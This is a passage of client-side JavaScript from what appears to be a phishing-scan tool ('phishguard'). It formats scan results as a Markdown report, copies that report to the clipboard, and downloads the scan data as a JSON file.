                else md += `- ${r.url}: Malicious: ${r.malicious}, Suspicious: ${r.suspicious}\n`;
            });
        }
        return md;
    }

    function copyMarkdownReport(btn) {
        const md = generateMarkdownReport();
        navigator.clipboard.writeText(md).then(() => {
            const originalText = btn.innerHTML;
            btn.innerHTML = '✅ Copied to Clipboard!';
            btn.classList.add('copied');
            setTimeout(() => {
                btn.innerHTML = originalText;
                btn.classList.remove('copied');
            }, 2000);
        }).catch(() => {
            alert('Failed to copy to clipboard.');
        });
    }

    function downloadJsonReport() {
        if (!lastScanData) return;
        const blob = new Blob([JSON.stringify(lastScanData, null, 2)], { type: 'application/json' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `phishguard-report-${Date.now()}.json`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    }

})();